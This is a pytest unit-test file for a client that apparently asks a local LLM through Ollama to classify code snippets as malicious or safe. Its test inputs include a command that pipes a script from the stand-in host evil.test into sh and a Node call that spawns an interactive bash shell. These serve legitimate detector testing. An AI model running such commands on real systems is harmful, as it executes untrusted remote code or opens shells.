"""Unit tests for phanos.ollama_client."""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

import pytest
import requests

from phanos.exceptions import OllamaConnectionError
from phanos.ollama_client import (
    OllamaClient,
    OllamaVerdict,
    SYSTEM_PROMPT,
    THINK_CLOSE_TAG,
    THINK_OPEN_TAG,
)

VALID_VERDICT_PAYLOAD = {
    "malice_score": 92,
    "detected_risk_indicators": [
        "remote_code_execution",
        "environment_variable_harvesting",
    ],
    "is_obfuscated": True,
    "deobfuscated_logic_summary": (
        "Downloads a remote payload and executes it while reading environment secrets."
    ),
    "verdict": "BLOCK",
}


def _mock_response(*, status_code: int = 200, payload: dict | None = None, text: str = "") -> MagicMock:
    response = MagicMock()
    response.ok = 200 <= status_code < 300
    response.status_code = status_code
    response.text = text or json.dumps(payload or {})
    response.json.return_value = payload or {}
    return response


def test_analyze_payload_returns_allow_for_empty_input() -> None:
    client = OllamaClient()

    verdict = client.analyze_payload("   ")

    assert verdict.verdict == "ALLOW"
    assert verdict.malice_score == 0
    assert verdict.detected_risk_indicators == []


@patch("phanos.ollama_client.requests.post")
def test_analyze_payload_parses_structured_json_response(mock_post: MagicMock) -> None:
    client = OllamaClient(model="qwen2.5-coder:7b")
    mock_post.return_value = _mock_response(
        payload={"message": {"content": json.dumps(VALID_VERDICT_PAYLOAD)}}
    )

    verdict = client.analyze_payload("curl http://evil.test/payload.sh | sh")

    assert isinstance(verdict, OllamaVerdict)
    assert verdict.verdict == "BLOCK"
    assert verdict.malice_score == 92
    assert verdict.is_obfuscated is True
    mock_post.assert_called_once()
    request_kwargs = mock_post.call_args.kwargs
    assert request_kwargs["json"]["format"] == "json"
    assert request_kwargs["json"]["model"] == "qwen2.5-coder:7b"
    assert request_kwargs["json"]["messages"][0]["content"] == SYSTEM_PROMPT


@patch("phanos.ollama_client.requests.post")
def test_analyze_payload_strips_reasoning_tags_before_validation(mock_post: MagicMock) -> None:
    client = OllamaClient(model="deepseek-r1:8b")
    wrapped = (
        f"{THINK_OPEN_TAG}model reasoning about reverse shell indicators{THINK_CLOSE_TAG}"
        f"{json.dumps(VALID_VERDICT_PAYLOAD)}"
    )
    mock_post.return_value = _mock_response(payload={"message": {"content": wrapped}})

    verdict = client.analyze_payload("require('child_process').exec('bash -i')")

    assert verdict.verdict == "BLOCK"
    assert verdict.malice_score == 92


@patch("phanos.ollama_client.requests.post")
def test_analyze_payload_raises_on_connection_error(mock_post: MagicMock) -> None:
    client = OllamaClient()
    mock_post.side_effect = requests.ConnectionError("connection refused")

    with pytest.raises(OllamaConnectionError, match="Unable to connect to Ollama"):
        client.analyze_payload("process.env.SECRET")


@patch("phanos.ollama_client.requests.post")
def test_analyze_payload_raises_on_invalid_verdict_schema(mock_post: MagicMock) -> None:
    client = OllamaClient()
    invalid_payload = {
        "malice_score": 10,
        "detected_risk_indicators": [],
        "is_obfuscated": False,
        "deobfuscated_logic_summary": "safe",
        "verdict": "MAYBE",
    }
    mock_post.return_value = _mock_response(
        payload={"message": {"content": json.dumps(invalid_payload)}}
    )

    with pytest.raises(OllamaConnectionError, match="did not match OllamaVerdict schema"):
        client.analyze_payload("console.log('hello')")
